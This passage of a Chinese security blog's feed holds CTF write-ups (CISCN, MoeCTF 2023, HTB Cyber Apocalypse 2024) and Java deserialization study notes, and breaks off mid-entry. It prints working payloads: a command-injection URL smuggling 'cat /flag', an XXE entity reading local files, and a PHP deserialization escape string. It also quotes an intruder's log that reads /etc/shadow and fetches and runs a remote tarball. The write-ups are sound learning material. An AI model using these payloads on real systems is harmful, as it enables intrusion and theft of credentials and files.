JDK默认也引用了Xalan，同时修改了原包名<code>org.apache.xalan.xsltc.trax.TemplatesImpl</code>为<code>com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl</code>，Xalan最大的特点是可以传入类字节码并初始化（需要调用<code>getOutputProperties</code>方法），从而实现RCE，比如Fastjson和Jackson会使用反射调用<code>getter/setter</code>或<code>成员变量映射</code>的方式实现JSON反序列化。</p><p><code>TemplatesImpl</code>中有一个<code>_bytecodes</code>成员变量，用于存储类字节码，通过JSON反序列化的方式可以修改该变量值，但因为该成员变量没有可映射的get&#x2F;set方法所以需要修改JSON库的虚拟化配置，比如Fastjson解析时必须启用<code>Feature.SupportNonPublicField</code>、Jackson必须开启<code>JacksonPolymorphicDeserialization</code>（调用<code>mapper.enableDefaultTyping()</code>），所以利用条件相对较高。</p><h5 id="JSP类加载"><a href="#JSP类加载" class="headerlink" title="JSP类加载"></a>JSP类加载</h5><p>JSP是JavaEE中的一种常用的脚本文件，可以在JSP中调用Java代码，实际上经过编译后的jsp就是一个Servlet文件，JSP和PHP一样可以实时修改。</p><p>众所周知，Java的类是不允许动态修改的（这里特指新增类方法或成员变量），之所以JSP具备热更新的能力，实际上借助的就是自定义类加载行为，当Servlet容器发现JSP文件发生了修改后就会创建一个新的类加载器来替代原类加载器，而被替代后的类加载器所加载的文件并不会立即释放，而是需要等待GC。</p><h5 id="ClassLoader总结"><a href="#ClassLoader总结" class="headerlink" title="ClassLoader总结"></a>ClassLoader总结</h5><p><code>ClassLoader</code>是JVM中一个非常重要的组成部分，<code>ClassLoader</code>可以为我们加载任意的java类，通过自定义<code>ClassLoader</code>更能够实现自定义类加载行为，在后面的几个章节我们也将讲解<code>ClassLoader</code>的实际利用场景。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;java代码审计学习&quot;&gt;&lt;a href=&quot;#java代码审计学习&quot; class=&quot;headerlink&quot; title=&quot;java代码审计学习&quot;&gt;&lt;/a&gt;java代码审计学习&lt;/h1&gt;&lt;h2 id=&quot;学习前的一些想法&quot;&gt;&lt;a href=&quot;#学习前的一些想法&quot; cla</summary>
      
    
    
    
    <category term="学习笔记" scheme="https://blog.xmszzz756.top/categories/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
    
    
    <category term="java安全" scheme="https://blog.xmszzz756.top/tags/java%E5%AE%89%E5%85%A8/"/>
    
  </entry>
  
  <entry>
    <title>CTF练习1</title>
    <link href="https://blog.xmszzz756.top/2024/07/14/CTF%E7%BB%83%E4%B9%A0/"/>
    <id>https://blog.xmszzz756.top/2024/07/14/CTF%E7%BB%83%E4%B9%A0/</id>
    <published>2024-07-14T14:08:12.999Z</published>
    <updated>2024-07-16T10:54:36.083Z</updated>
    
    <content type="html"><![CDATA[<h1 id="CTF练习1"><a href="#CTF练习1" class="headerlink" title="CTF练习1"></a>CTF练习1</h1><h2 id="BUUCTF-加固题"><a href="#BUUCTF-加固题" class="headerlink" title="BUUCTF 加固题"></a>BUUCTF 加固题</h2><h3 id="CISCN2021-总决赛-babypython"><a href="#CISCN2021-总决赛-babypython" class="headerlink" title="[CISCN2021 总决赛]babypython"></a>[CISCN2021 总决赛]babypython</h3><p>简单回顾了下题目的解法</p><p>unzip软链接读取源码和网卡等信息、构造uuid获得随机数种子，伪造session获得flag</p><h4 id="修复点1"><a href="#修复点1" class="headerlink" title="修复点1"></a>修复点1</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">def check_symlinks_in_directory(directory_path):</span><br><span class="line">    for root, dirs, files in os.walk(directory_path):</span><br><span class="line">        for name in files:</span><br><span class="line">            file_path = os.path.join(root, name)</span><br><span class="line">            # 检查文件是否是软链接</span><br><span class="line">            if os.path.islink(file_path):</span><br><span class="line">                return True</span><br><span class="line">    return False</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">try:</span><br><span class="line">        extract_path = file_save_path + &#x27;_&#x27;</span><br><span class="line">        os.system(&#x27;unzip -n &#x27; + file_save_path + &#x27; -d &#x27;+ extract_path)</span><br><span class="line">        #增加对上传文件的软链接检查</span><br><span class="line">        if check_symlinks_in_directory(extract_path):</span><br><span class="line">            os.system(&#x27;rm -rf &#x27; + extract_path)</span><br><span class="line">            os.remove(file_save_path)</span><br><span class="line">            return &#x27;This file is not safe&#x27;</span><br><span class="line">        read_obj = os.popen(&#x27;cat &#x27; + extract_path + &#x27;/*&#x27;)</span><br><span class="line">        file = read_obj.read()</span><br><span class="line">        read_obj.close()</span><br><span class="line">        os.system(&#x27;rm -rf &#x27; + extract_path)</span><br><span class="line">    except Exception as e:</span><br><span class="line">        file = None</span><br></pre></td></tr></table></figure><h4 id="修复点2"><a href="#修复点2" class="headerlink" title="修复点2"></a>修复点2</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">import secrets</span><br><span class="line"></span><br><span class="line">app.config[&#x27;SECRET_KEY&#x27;] = str(secrets.randbelow(10000000000))</span><br><span class="line">#app.config[&#x27;SECRET_KEY&#x27;] =secrets.token_hex(16)</span><br></pre></td></tr></table></figure><p>check不过&#x3D;.&#x3D;，这check机制好难捉摸，本地测原来的攻击方法确实是打不通了</p><h2 id="CTFshow"><a href="#CTFshow" class="headerlink" title="CTFshow"></a>CTFshow</h2><h3 id="CISCN2024web"><a href="#CISCN2024web" class="headerlink" title="CISCN2024web"></a>CISCN2024web</h3><h4 id="easycms"><a href="#easycms" class="headerlink" title="easycms"></a>easycms</h4><p>简单的cms，可以扫扫看？ </p><p>提示1： &#x2F;flag.php： </p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">if($_SERVER[&quot;REMOTE_ADDR&quot;] != &quot;127.0.0.1&quot;)&#123;</span><br><span class="line">   echo &quot;Just input &#x27;cmd&#x27; From 127.0.0.1&quot;;</span><br><span class="line">   return;</span><br><span class="line">&#125;else&#123;</span><br><span class="line">   system($_GET[&#x27;cmd&#x27;]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>提示2：github找一下源码?</p><p>迅睿 CMS存在ssrf漏洞，结合flag.php命令执行，借助vps外带命令执行结果</p><p><img src="https://cdn.jsdelivr.net/gh/bthcls756/photo@main/image-20240715193102622.png" alt="image-20240715193102622"></p><p><img src="https://cdn.jsdelivr.net/gh/bthcls756/photo@main/image-20240715193211824.png" alt="image-20240715193211824"></p><p><img src="https://cdn.jsdelivr.net/gh/bthcls756/photo@main/image-20240715193223806.png" alt="image-20240715193223806"></p><h4 id="CNVD-C-2022-423202"><a href="#CNVD-C-2022-423202" class="headerlink" title="CNVD-C-2022-423202"></a>CNVD-C-2022-423202</h4><p>迅睿 CMS存在ssrf漏洞，复现审计一下</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;CTF练习1&quot;&gt;&lt;a href=&quot;#CTF练习1&quot; class=&quot;headerlink&quot; title=&quot;CTF练习1&quot;&gt;&lt;/a&gt;CTF练习1&lt;/h1&gt;&lt;h2 id=&quot;BUUCTF-加固题&quot;&gt;&lt;a href=&quot;#BUUCTF-加固题&quot; class=&quot;headerli</summary>
      
    
    
    
    <category term="CTF" scheme="https://blog.xmszzz756.top/categories/CTF/"/>
    
    
    <category term="代码审计" scheme="https://blog.xmszzz756.top/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
  </entry>
  
  <entry>
    <title>Moe CTF 2023复现</title>
    <link href="https://blog.xmszzz756.top/2024/07/13/Moe%20CTF%202023%E5%A4%8D%E7%8E%B0/"/>
    <id>https://blog.xmszzz756.top/2024/07/13/Moe%20CTF%202023%E5%A4%8D%E7%8E%B0/</id>
    <published>2024-07-13T13:37:39.626Z</published>
    <updated>2024-07-14T12:44:33.097Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Moe-CTF-2023复现"><a href="#Moe-CTF-2023复现" class="headerlink" title="Moe CTF 2023复现"></a>Moe CTF 2023复现</h1><p>题目质量很高，可惜很多题目没办法赛后在这个平台复现，想看一下取证和AI题。</p><p><a href="https://ctf.xidian.edu.cn/playground">复现平台</a></p><p>题目启动&#x2F;关闭</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">service start/stop</span><br></pre></td></tr></table></figure><p><a href="https://forensics.xidian.edu.cn/git/CyberTerminal/WebSocketReflectorX/releases/download/wsrx-desktop-v0.1.5/WSRX.Desktop_0.1.5_x64_en-US.msi">WSRX Desktop安装包</a></p><p>在线环境题目需wss协议连接</p><p><img src="https://cdn.jsdelivr.net/gh/bthcls756/photo@main/image-20240713213040514.png" alt="image-20240713213040514"></p><h2 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h2><h3 id="http"><a href="#http" class="headerlink" title="http"></a>http</h3><p>给出了任务</p><p><img src="https://cdn.jsdelivr.net/gh/bthcls756/photo@main/image-20240713212902129.png" alt="image-20240713212902129"></p><p>构造请求包</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">POST /?UwU=u HTTP/1.1</span><br><span class="line">Host: localhost:1938</span><br><span class="line">X-Forwarded-For: 127.0.0.1</span><br><span class="line">Sec-Fetch-User: ?1</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line">Sec-Fetch-Dest: document</span><br><span class="line">Sec-Fetch-Mode: navigate</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/png,image/svg+xml,*/*;q=0.8</span><br><span class="line">Accept-Encoding: gzip, deflate, br, zstd</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">Sec-Fetch-Site: none</span><br><span class="line">Cookie: character=admin</span><br><span class="line">Priority: u=0, i</span><br><span class="line">User-Agent: MoeBrowser</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line"></span><br><span class="line">Luv=u</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/bthcls756/photo@main/image-20240713212932145.png" alt="image-20240713212932145"></p><h3 id="Web入门指北"><a href="#Web入门指北" class="headerlink" title="Web入门指北"></a>Web入门指北</h3><p>新手指南pdf，最后给了一串字符串，hex+Base64解码，指导方式很不错的新生赛题</p><p><img src="https://cdn.jsdelivr.net/gh/bthcls756/photo@main/image-20240713213558070.png" alt="image-20240713213558070"></p><p><img src="https://cdn.jsdelivr.net/gh/bthcls756/photo@main/image-20240713213613016.png" alt="image-20240713213613016"></p><h3 id="彼岸的flag"><a href="#彼岸的flag" class="headerlink" title="彼岸的flag"></a>彼岸的flag</h3><p><a href="https://www.cnblogs.com/l-yf/p/13879730.html">前端实现简单的聊天页面    </a></p><p>挺有意思的这题，flag在撤回的消息里</p><p><img src="https://cdn.jsdelivr.net/gh/bthcls756/photo@main/image-20240713214243754.png" alt="image-20240713214243754"></p><h3 id="cookie"><a href="#cookie" class="headerlink" title="cookie"></a>cookie</h3><p>附件有api说明</p><p><img src="https://cdn.jsdelivr.net/gh/bthcls756/photo@main/image-20240713221253070.png" alt="image-20240713221253070"></p><p>尝试通过register接口改admin用户密码登admin用户，没成功。爆破admin用户密码读flag没成功。直接伪造cookie变admin的权限读flag不成功。</p><p>这题写死了是必须先伪造admin权限登录再访问flag</p><p><img src="https://cdn.jsdelivr.net/gh/bthcls756/photo@main/image-20240713221438200.png" alt="image-20240713221438200"></p><p><img src="https://cdn.jsdelivr.net/gh/bthcls756/photo@main/image-20240713221450384.png" alt="image-20240713221450384"></p><p><img src="https://cdn.jsdelivr.net/gh/bthcls756/photo@main/image-20240713221458665.png" alt="image-20240713221458665"></p><h3 id="gas-gas-gas"><a href="#gas-gas-gas" class="headerlink" title="gas!gas!gas!"></a>gas!gas!gas!</h3><p>写脚本了。</p><p><img src="https://cdn.jsdelivr.net/gh/bthcls756/photo@main/image-20240713222152349.png" alt="image-20240713222152349"></p><p>额,延迟太高了，完不成0.5s内反应，我写的没法测试，放一个别人的脚本</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">import requests</span><br><span class="line">from time import sleep</span><br><span class="line">import bs4</span><br><span class="line"></span><br><span class="line">url = &quot;这里写网址&quot;</span><br><span class="line"></span><br><span class="line">session = requests.session()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def req(driver, steering_control, throttle):</span><br><span class="line">    data = &#123;</span><br><span class="line">        &quot;driver&quot;: driver,  # 选手</span><br><span class="line">        &quot;steering_control&quot;: steering_control,  # 方向</span><br><span class="line">        &quot;throttle&quot;: throttle  # 油门</span><br><span class="line">    &#125;</span><br><span class="line">    resp = session.post(url, data=data)</span><br><span class="line">    return resp.text</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def tq(text):</span><br><span class="line">    bs4_text = bs4.BeautifulSoup(text, &quot;html.parser&quot;).find(&quot;h3&quot;).text</span><br><span class="line">    print(bs4_text)</span><br><span class="line">    return bs4_text</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def pd(text):</span><br><span class="line">    if &quot;失误&quot; in text:</span><br><span class="line">        return False, False</span><br><span class="line">    if &quot;向右&quot; in text:</span><br><span class="line">        steering_control = -1</span><br><span class="line">    elif &quot;直行&quot; in text:</span><br><span class="line">        steering_control = 0</span><br><span class="line">    elif &quot;向左&quot; in text:</span><br><span class="line">        steering_control = 1</span><br><span class="line">    if &quot;太小&quot; in text:</span><br><span class="line">        throttle = 0</span><br><span class="line">    elif &quot;保持&quot; in text:</span><br><span class="line">        throttle = 1</span><br><span class="line">    elif &quot;太大&quot; in text:</span><br><span class="line">        throttle = 2</span><br><span class="line">    return steering_control, throttle</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def main():</span><br><span class="line">    steering_control = 1</span><br><span class="line">    throttle = -1</span><br><span class="line">    count = 0</span><br><span class="line">    for i in range(7):</span><br><span class="line">        count+=1</span><br><span class="line">        text = req(666666, steering_control, throttle)</span><br><span class="line">        if &quot;完美&quot; in text:</span><br><span class="line">            print(text)</span><br><span class="line">            return 0</span><br><span class="line">        a, b = pd(tq(text))</span><br><span class="line">        if a is False:</span><br><span class="line">            return 0</span><br><span class="line">        # print(a,b)</span><br><span class="line">        steering_control, throttle = a, b</span><br><span class="line">        print(count)</span><br><span class="line">    session.close()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">if __name__ == &#x27;__main__&#x27;:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/bthcls756/photo@main/image-20240713231819447.png" alt="image-20240713231819447"></p><h3 id="moe图床"><a href="#moe图床" class="headerlink" title="moe图床"></a>moe图床</h3><p>文件上传，检查Content-Type: image&#x2F;png和文件名第一个.后的拓展名是否为png</p><p><img src="https://cdn.jsdelivr.net/gh/bthcls756/photo@main/image-20240714163958363.png" alt="image-20240714163958363"></p><p><img src="https://cdn.jsdelivr.net/gh/bthcls756/photo@main/image-20240714164014931.png" alt="image-20240714164014931"></p><h3 id="了解你的座驾"><a href="#了解你的座驾" class="headerlink" title="了解你的座驾"></a>了解你的座驾</h3><p>xxe 读flag</p><p><img src="https://cdn.jsdelivr.net/gh/bthcls756/photo@main/image-20240714165107496.png" alt="image-20240714165107496"></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE creds [</span><br><span class="line">&lt;!ENTITY goodies SYSTEM &quot;file:///flag&quot;&gt;</span><br><span class="line">]&gt;</span><br><span class="line">&lt;creds&gt;</span><br><span class="line">    &lt;name&gt;&amp;goodies;&lt;/name&gt;</span><br><span class="line">&lt;/creds&gt;</span><br><span class="line"></span><br><span class="line">%3C%3Fxml+version%3D%221.0%22+encoding%3D%22utf-8%22%3F%3E%0A%3C%21DOCTYPE+creds+%5B%0A%3C%21ENTITY+goodies+SYSTEM+%22file%3A%2F%2F%2Fflag%22%3E%0A%5D%3E%0A%3Ccreds%3E%0A++++%3Cname%3E%26goodies%3B%3C%2Fname%3E%0A%3C%2Fcreds%3E</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/bthcls756/photo@main/image-20240714165132149.png" alt="image-20240714165132149"></p><h3 id="meo图床2"><a href="#meo图床2" class="headerlink" title="meo图床2"></a>meo图床2</h3><p>上传后发现是任意文件读取</p><p><img src="https://cdn.jsdelivr.net/gh/bthcls756/photo@main/image-20240714170737532.png" alt="image-20240714170737532"></p><p>提示一个文件</p><p><img src="https://cdn.jsdelivr.net/gh/bthcls756/photo@main/image-20240714170803822.png" alt="image-20240714170803822"></p><p>md5弱比较</p><p><img src="https://cdn.jsdelivr.net/gh/bthcls756/photo@main/image-20240714170836078.png" alt="image-20240714170836078"></p><h3 id="夺命十三枪"><a href="#夺命十三枪" class="headerlink" title="夺命十三枪"></a>夺命十三枪</h3><p>chant可控，Make_a_Move存在字符串替换，字符串逃逸反序列化</p><p><img src="https://cdn.jsdelivr.net/gh/bthcls756/photo@main/image-20240714171448494.png" alt="image-20240714171448494"></p><p><img src="https://cdn.jsdelivr.net/gh/bthcls756/photo@main/image-20240714171502695.png" alt="image-20240714171502695"></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">chant=di_qi_qiangdi_qi_qiangdi_qi_qiangdi_qi_qiangdi_qi_qiangdi_qi_qiangdi_qi_qiang&quot;;s:11:&quot;Spear_Owner&quot;;s:6:&quot;MaoLei&quot;;&#125;</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/bthcls756/photo@main/image-20240714171622699.png" alt="image-20240714171622699"></p><h3 id="signin"><a href="#signin" class="headerlink" title="signin"></a>signin</h3><p>题目给了源码</p><p>这题考察一个异或和弱类型比较绕过</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">from secrets import users, salt</span><br><span class="line">import hashlib</span><br><span class="line">import base64</span><br><span class="line">import json</span><br><span class="line">import http.server</span><br><span class="line"></span><br><span class="line">with open(&quot;flag.txt&quot;,&quot;r&quot;) as f:</span><br><span class="line">    FLAG = f.read().strip()</span><br><span class="line"></span><br><span class="line"># 遍历值异或后hex</span><br><span class="line">def gethash(*items):</span><br><span class="line">    c = 0</span><br><span class="line">    for item in items:</span><br><span class="line">        if item is None:</span><br><span class="line">            continue</span><br><span class="line">        c ^= int.from_bytes(hashlib.md5(f&quot;&#123;salt&#125;[&#123;item&#125;]&#123;salt&#125;&quot;.encode()).digest(), &quot;big&quot;) # it looks so complex! but is it safe enough?</span><br><span class="line">    return hex(c)[2:]</span><br><span class="line"></span><br><span class="line"># 判断&quot;admin&quot;:&quot;admin&quot;是否在users中</span><br><span class="line">assert &quot;admin&quot; in users</span><br><span class="line">assert users[&quot;admin&quot;] == &quot;admin&quot;</span><br><span class="line"></span><br><span class="line"># &quot;admin&quot;:&quot;admin&quot;的结果是&#123;&#x27;admin&#x27;: &#x27;0&#x27;&#125; 相同的值异或为0 任何值和0异或等于它本身</span><br><span class="line">hashed_users = dict((k,gethash(k,v)) for k,v in users.items())</span><br><span class="line"></span><br><span class="line">eval(int.to_bytes(0x636d616f686e69656e61697563206e6965756e63696165756e6320696175636e206975616e6363616361766573206164^8651845801355794822748761274382990563137388564728777614331389574821794036657729487047095090696384065814967726980153,160,&quot;big&quot;,signed=True).decode().translate(&#123;ord(c):None for c in &quot;\x00&quot;&#125;)) # what is it?</span><br><span class="line">    </span><br><span class="line">def decrypt(data:str):</span><br><span class="line">        for x in range(5):</span><br><span class="line">            data = base64.b64encode(data).decode() # ummm...? It looks like it&#x27;s just base64 encoding it 5 times? truely?</span><br><span class="line">        return data</span><br><span class="line"></span><br><span class="line">__page__ = base64.b64encode(&quot;页面源码，太长了我删了&quot;)</span><br><span class="line">        </span><br><span class="line">class MyHandler(http.server.BaseHTTPRequestHandler):</span><br><span class="line">    def do_GET(self):</span><br><span class="line">        try:</span><br><span class="line">            if self.path == &quot;/&quot;:</span><br><span class="line">                self.send_response(200)</span><br><span class="line">                self.end_headers()</span><br><span class="line">                self.wfile.write(__page__)</span><br><span class="line">            else:</span><br><span class="line">                self.send_response(404)</span><br><span class="line">                self.end_headers()</span><br><span class="line">                self.wfile.write(b&quot;404 Not Found&quot;)</span><br><span class="line">        except Exception as e:</span><br><span class="line">            print(e)</span><br><span class="line">            self.send_response(500)</span><br><span class="line">            self.end_headers()</span><br><span class="line">            self.wfile.write(b&quot;500 Internal Server Error&quot;)</span><br><span class="line"></span><br><span class="line">    def do_POST(self):</span><br><span class="line">        try:</span><br><span class="line">            if self.path == &quot;/login&quot;:</span><br><span class="line">                body = self.rfile.read(int(self.headers.get(&quot;Content-Length&quot;)))</span><br><span class="line">                payload = json.loads(body)</span><br><span class="line">                params = json.loads(decrypt(payload[&quot;params&quot;]))</span><br><span class="line">                print(params)</span><br><span class="line">                # 用户名不能为admin</span><br><span class="line">                if params.get(&quot;username&quot;) == &quot;admin&quot;:</span><br><span class="line">                    self.send_response(403)</span><br><span class="line">                    self.end_headers()</span><br><span class="line">                    self.wfile.write(b&quot;YOU CANNOT LOGIN AS ADMIN!&quot;)</span><br><span class="line">                    print(&quot;admin&quot;)</span><br><span class="line">                    return</span><br><span class="line">                # 用户名密码不能相同</span><br><span class="line">                if params.get(&quot;username&quot;) == params.get(&quot;password&quot;):</span><br><span class="line">                    self.send_response(403)</span><br><span class="line">                    self.end_headers()</span><br><span class="line">                    self.wfile.write(b&quot;YOU CANNOT LOGIN WITH SAME USERNAME AND PASSWORD!&quot;)</span><br><span class="line">                    print(&quot;same&quot;)</span><br><span class="line">                    return</span><br><span class="line">                hashed = gethash(params.get(&quot;username&quot;),params.get(&quot;password&quot;))</span><br><span class="line">                for k,v in hashed_users.items():</span><br><span class="line">                    # 弱比较hashed和hashed_users中hashed的值</span><br><span class="line">                    if hashed == v:</span><br><span class="line">                        data = &#123;</span><br><span class="line">                            &quot;user&quot;:k,</span><br><span class="line">                            &quot;hash&quot;:hashed,</span><br><span class="line">                            &quot;flag&quot;: FLAG if k == &quot;admin&quot; else &quot;flag&#123;YOU_HAVE_TO_LOGIN_IN_AS_ADMIN_TO_GET_THE_FLAG&#125;&quot;</span><br><span class="line">                        &#125;</span><br><span class="line">                        self.send_response(200)</span><br><span class="line">                        self.end_headers()</span><br><span class="line">                        self.wfile.write(json.dumps(data).encode())</span><br><span class="line">                        print(&quot;success&quot;)</span><br><span class="line">                        return</span><br><span class="line">                self.send_response(403)</span><br><span class="line">                self.end_headers()</span><br><span class="line">                self.wfile.write(b&quot;Invalid username or password&quot;)</span><br><span class="line">            else:</span><br><span class="line">                self.send_response(404)</span><br><span class="line">                self.end_headers()</span><br><span class="line">                self.wfile.write(b&quot;404 Not Found&quot;)</span><br><span class="line">        except Exception as e:</span><br><span class="line">            print(e)</span><br><span class="line">            self.send_response(500)</span><br><span class="line">            self.end_headers()</span><br><span class="line">            self.wfile.write(b&quot;500 Internal Server Error&quot;)</span><br><span class="line"></span><br><span class="line">if __name__ == &quot;__main__&quot;:</span><br><span class="line">    server = http.server.HTTPServer((&quot;&quot;, 9999), MyHandler)</span><br><span class="line">    server.serve_forever()</span><br></pre></td></tr></table></figure><p>因为不比较用户名，所以用户名只要不为admin就行，但是因为要又要让用户密码相同得到hashed为0的结果，所以需要用户和密码的类型分别为字符串和数字</p><p><img src="https://cdn.jsdelivr.net/gh/bthcls756/photo@main/image-20240714200352484.png" alt="image-20240714200352484"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;Moe-CTF-2023复现&quot;&gt;&lt;a href=&quot;#Moe-CTF-2023复现&quot; class=&quot;headerlink&quot; title=&quot;Moe CTF 2023复现&quot;&gt;&lt;/a&gt;Moe CTF 2023复现&lt;/h1&gt;&lt;p&gt;题目质量很高，可惜很多题目没办法赛后在这个平</summary>
      
    
    
    
    <category term="比赛复现" scheme="https://blog.xmszzz756.top/categories/%E6%AF%94%E8%B5%9B%E5%A4%8D%E7%8E%B0/"/>
    
    
    <category term="MoeCTF" scheme="https://blog.xmszzz756.top/tags/MoeCTF/"/>
    
  </entry>
  
  <entry>
    <title>HTB cyber-apocalypse-2024</title>
    <link href="https://blog.xmszzz756.top/2024/07/09/Hack%20The%20Box%20CTF/"/>
    <id>https://blog.xmszzz756.top/2024/07/09/Hack%20The%20Box%20CTF/</id>
    <published>2024-07-09T04:41:28.852Z</published>
    <updated>2024-07-11T11:17:51.821Z</updated>
    
    <content type="html"><![CDATA[<h1 id="HTB-cyber-apocalypse-2024"><a href="#HTB-cyber-apocalypse-2024" class="headerlink" title="HTB cyber-apocalypse-2024"></a>HTB cyber-apocalypse-2024</h1><p>附件解压密码统一为hackthebox</p><p>部分环境是web环境，部分是pwn环境（nc连接）</p><h2 id="Warmup"><a href="#Warmup" class="headerlink" title="Warmup"></a>Warmup</h2><h3 id="Welcome-to-CTF"><a href="#Welcome-to-CTF" class="headerlink" title="Welcome to CTF"></a>Welcome to CTF</h3><p>HTB{onboard1ng_fl4g}</p><p><img src="https://cdn.jsdelivr.net/gh/bthcls756/photo@main/image-20240709154143591.png" alt="image-20240709154143591"></p><h2 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h2><h3 id="TimeKORP"><a href="#TimeKORP" class="headerlink" title="TimeKORP"></a>TimeKORP</h3><p>下载附件，压缩包密码统一为hackthebox，分析源码，命令执行</p><p><img src="https://cdn.jsdelivr.net/gh/bthcls756/photo@main/image-20240709154408342.png" alt="image-20240709154408342"></p><p>payload：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://94.237.53.113:41219/?format=%s%27;cat%20/flag;%27</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/bthcls756/photo@main/image-20240709154437033.png" alt="image-20240709154437033"></p><h3 id="Flag-Command"><a href="#Flag-Command" class="headerlink" title="Flag Command"></a>Flag Command</h3><p>小游戏，接口有个secret步骤，输入<strong>Blip-blop, in a pickle with a hiccup! Shmiggity-shmack</strong>就能通关</p><p><img src="https://cdn.jsdelivr.net/gh/bthcls756/photo@main/image-20240709160202909.png" alt="image-20240709160202909"></p><p><img src="https://cdn.jsdelivr.net/gh/bthcls756/photo@main/image-20240709160327616.png" alt="image-20240709160327616"></p><h3 id="Labyrinth-Linguist"><a href="#Labyrinth-Linguist" class="headerlink" title="Labyrinth Linguist"></a>Labyrinth Linguist</h3><p>java Velocity ssti</p><p><img src="https://cdn.jsdelivr.net/gh/bthcls756/photo@main/image-20240709165647212.png" alt="image-20240709165647212"></p><p><img src="https://cdn.jsdelivr.net/gh/bthcls756/photo@main/image-20240709165700566.png" alt="image-20240709165700566"></p><p>tplmap一把嗦</p><p><img src="https://cdn.jsdelivr.net/gh/bthcls756/photo@main/image-20240709165723896.png" alt="image-20240709165723896"></p><h2 id="Forensics"><a href="#Forensics" class="headerlink" title="Forensics"></a>Forensics</h2><h3 id="An-unusual-sighting"><a href="#An-unusual-sighting" class="headerlink" title="An unusual sighting"></a>An unusual sighting</h3><p>直接看附件的sshd.log和bash_history.txt</p><p>黑客2.67.182.119:60071在2024-02-19 04:00:14连接服务器100.107.36.130:2221，公钥连接错误，ssh2: ECDSA SHA256:OPkBSs6okUKraq8pYo4XwwBg55QSo210F09FCe1-yj4，使用密码登录成功，在2024-02-19 04:38:17结束连接</p><p>期间执行以下命令</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[2024-02-19 04:00:18] whoami</span><br><span class="line">[2024-02-19 04:00:20] uname -a</span><br><span class="line">[2024-02-19 04:00:40] cat /etc/passwd</span><br><span class="line">[2024-02-19 04:01:01] cat /etc/shadow</span><br><span class="line">[2024-02-19 04:01:15] ps faux</span><br><span class="line">[2024-02-19 04:02:27] wget https://gnu-packages.com/prebuilts/iproute2/latest.tar.gz -O /tmp/latest_iproute.tar.gz</span><br><span class="line">[2024-02-19 04:10:02] tar xvf latest.tar.gz</span><br><span class="line">[2024-02-19 04:12:02] shred -zu latest.tar.gz</span><br><span class="line">[2024-02-19 04:14:02] ./setup</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/bthcls756/photo@main/image-20240710134512893.png" alt="image-20240710134512893"></p><h3 id="Phreaky"><a href="#Phreaky" class="headerlink" title="Phreaky"></a>Phreaky</h3><blockquote><p>In the shadowed realm where the Phreaks hold sway,<br>A mole lurks within, leading them astray.<br>Sending keys to the Talents, so sly and so slick,<br>A network packet capture must reveal the trick.<br>Through data and bytes, the sleuth seeks the sign,<br>Decrypting messages, crossing the line.<br>The traitor unveiled, with nowhere to hide,<br>Betrayal confirmed, they’d no longer abide.</p></blockquote><p>在smtp协议中发现有发送zip附件的15封邮件</p><p><img src="https://cdn.jsdelivr.net/gh/bthcls756/photo@main/image-20240710171219162.png" alt="image-20240710171219162"></p><p>全部导出用密码解压，得到phreaks_plan.pdf.part1到15</p><p><img src="https://cdn.jsdelivr.net/gh/bthcls756/photo@main/image-20240710171310481.png" alt="image-20240710171310481"></p><p>010查看，应该是要将每个的数据放到一个pdf文件中即可复原</p><p><img src="https://cdn.jsdelivr.net/gh/bthcls756/photo@main/image-20240710171425929.png" alt="image-20240710171425929"></p><p><img src="https://cdn.jsdelivr.net/gh/bthcls756/photo@main/image-20240710171433985.png" alt="image-20240710171433985"></p><p>脚本恢复</p><p>files.txt</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">phreaks_plan.pdf.part1</span><br><span class="line">phreaks_plan.pdf.part2</span><br><span class="line">phreaks_plan.pdf.part3</span><br><span class="line">phreaks_plan.pdf.part4</span><br><span class="line">phreaks_plan.pdf.part5</span><br><span class="line">phreaks_plan.pdf.part6</span><br><span class="line">phreaks_plan.pdf.part7</span><br><span 